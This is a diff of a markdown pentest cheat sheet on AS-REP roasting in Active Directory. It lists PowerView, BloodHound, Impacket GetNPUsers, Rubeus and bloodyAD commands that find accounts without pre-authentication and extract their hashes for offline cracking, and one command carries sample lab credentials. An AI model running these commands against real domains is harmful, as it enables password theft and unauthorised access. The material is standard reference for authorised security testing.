@@ -6,15 +6,15 @@
 
 ## Find ASREPRoastable users (need creds)
 
- - Get-DomainUser -PreauthNotRequired -Properties SamAccountName
+    Get-DomainUser -PreauthNotRequired -Properties SamAccountName
 
  - MATCH(u:User {dontreqpreauth:true}). (c:Computer). p=shortestPath((u)-[*1..]->(c)) RETURN p (Bloodhound cypher query)
 
 ## Find ASREP hash
 
- - Impacket-GetNPUsers DOMAIN/ -usersfile USERNAMES.TXT -format hashcat -dc-ip DC_IP -dc-host DC.DOMAIN.LOCAL -outputfile HASHES.DOMAIN.TXT
+    Impacket-GetNPUsers DOMAIN/ -usersfile USERNAMES.TXT -format hashcat -dc-ip DC_IP -dc-host DC.DOMAIN.LOCAL -outputfile HASHES.DOMAIN.TXT
 
- - Rubeus.exe asreproast /format:hashcat
+    Rubeus.exe asreproast /format:hashcat
 
 ### Occurs when a user account has the privilege "Does not require Pre-Authentication" set.
 
@@ -24,29 +24,43 @@
 
 ### Accounts with the attribute DONT_REQ_PREAUTH ( PowerView > Get-DomainUser -PreauthNotRequired -Properties distinguishedname -Verbose )
 
-#### Impacket-GetNPUsers.py domain.com\john.doe -no-pass (Retrieves a TGT)
+#### 
+
+    Impacket-GetNPUsers.py domain.com\john.doe -no-pass (Retrieves a TGT)
 
 ### You can also do:
 
 #### 1) Gather domain accounts in a list
 
-#### 2) python3 Impacket-GetNPUsers.py -dc-ip DC_IP DOMAIN/USER -outputfile /tmp/list.txt
+#### 2) 
+
+    python3 Impacket-GetNPUsers.py -dc-ip DC_IP DOMAIN/USER -outputfile /tmp/list.txt
 
 # Enumeration (Need domain credentials)
 
 ## Windows
 
- - Get-DomainUser -PreauthNotRequired -verbose (Powerview)
+    Get-DomainUser -PreauthNotRequired -verbose (Powerview)
 
 ## Linux 
 
- - bloodyAD -u user -p 'totoTOTOtoto1234*' -d crash.lab --host 10.100.10.5 get search --filter '(&(userAccountControl:1.2.840.113556.1.4.803:=4194304)(!(UserAccountControl:1.2.840.113556.1.4.803:=2)))' --attr sAMAccountName  
+    bloodyAD -u user -p 'totoTOTOtoto1234*' -d crash.lab --host 10.100.10.5 get search --filter '(&(userAccountControl:1.2.840.113556.1.4.803:=4194304)(!(UserAccountControl:1.2.840.113556.1.4.803:=2)))' --attr sAMAccountName  
 
 ## Method: Impacket GetNPUsers
 
- - python GetNPUsers.py jurassic.park/ -usersfile usernames.txt -format hashcat -outputfile hashes.asreproast (Try all the usernames in usernames.txt)
+##### Enumerate Users
 
- - python GetNPUsers.py jurassic.park/triceratops:Sh4rpH0rns -request -format hashcat -outputfile hashes.asreproast (Use domain creds to extract targets and target them)
+    GetNPUsers.py -dc-ip <DC_IP> domain.local/user1:password
+
+##### Request AS-REP 
+
+    GetNPUsers.py -dc-ip <DC_IP> -request -format john domain.local/user1:password
+
+It is possible to force DES if it is allowed.
+
+    python GetNPUsers.py jurassic.park/ -usersfile usernames.txt -format hashcat -outputfile hashes.asreproast (Try all the usernames in usernames.txt)
+
+    python GetNPUsers.py jurassic.park/triceratops:Sh4rpH0rns -request -format hashcat -outputfile hashes.asreproast (Use domain creds to extract targets and target them)
 
 ## Alternate Method: CrackMapExec
 
